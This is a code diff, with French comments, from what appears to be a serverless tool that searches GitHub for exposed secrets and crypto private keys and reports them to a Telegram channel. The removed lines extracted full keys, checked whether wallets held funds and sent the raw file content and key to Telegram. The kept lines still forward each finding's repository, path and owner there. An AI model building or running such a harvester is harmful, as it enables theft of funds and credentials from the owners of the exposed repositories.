@@ -302,50 +302,23 @@ serve(async (req) => {
 
               findingsCount++;
 
-              const fullKey = extractFullKey(content);
-              const balanceInfo = await checkBalance(content);
-
-              // Préparer le contenu COMPLET du fichier (max 3000 chars pour Telegram)
-              const fileContent = content.length > 3000 ? content.substring(0, 3000) + '\n\n... (tronqué)' : content;
-
-              // LOG LIVE: Finding détecté - CONTENU COMPLET
+              // LOG LIVE: Finding détecté - SIMPLE
               const emoji = pattern.severity === 'critical' ? '🔴' : pattern.severity === 'high' ? '🟠' : '🟡';
               
-              // Message 1 : Info du finding
-              let msg1 = `
-${emoji} *FINDING #${findingsCount}* ${balanceInfo.hasBalance ? '💰' : ''}
+              // Message SIMPLE
+              const msg = `
+${emoji} *FINDING #${findingsCount}*
 
 🔍 [${item.repository.full_name}](${item.repository.html_url})
 📁 \`${item.path}\`
 👤 @${item.repository.owner.login}
 
 📋 ${pattern.pattern_type} | ${pattern.severity.toUpperCase()}
-⏰ ${new Date().toLocaleTimeString('fr-FR')}
+🔗 [Voir le fichier](${item.html_url})
               `.trim();
 
-              if (balanceInfo.hasBalance) {
-                fundedCount++;
-                msg1 += `\n\n💰 *BALANCE DÉTECTÉE !*\n💵 ${balanceInfo.balance} ${balanceInfo.currency}\n💲 $${balanceInfo.balanceUSD?.toFixed(2)}\n⛓️ ${balanceInfo.blockchain}`;
-              }
-
-              msg1 += `\n\n🔗 [Voir le fichier](${item.html_url})`;
-
-              // Message 2 : CONTENU BRUT COMPLET du fichier
-              const msg2 = `
-📄 *CONTENU COMPLET DU FICHIER:*
-
-\`\`\`
-${fileContent}
-\`\`\`
-
-🔑 *Clé extraite:* \`${fullKey}\`
-
-📋 Vous pouvez copier le contenu ci-dessus pour analyse manuelle.
-              `.trim();
-
-              // Envoyer les 2 messages vers channel ALL
-              await sendTelegram(msg1, CHAT_ID_ALL);
-              await sendTelegram(msg2, CHAT_ID_ALL);
+              // Envoyer vers channel ALL
+              await sendTelegram(msg, CHAT_ID_ALL);
 
               // Détecter si c'est une clé privée crypto - LISTE EXHAUSTIVE
               const isCryptoPrivateKey = [
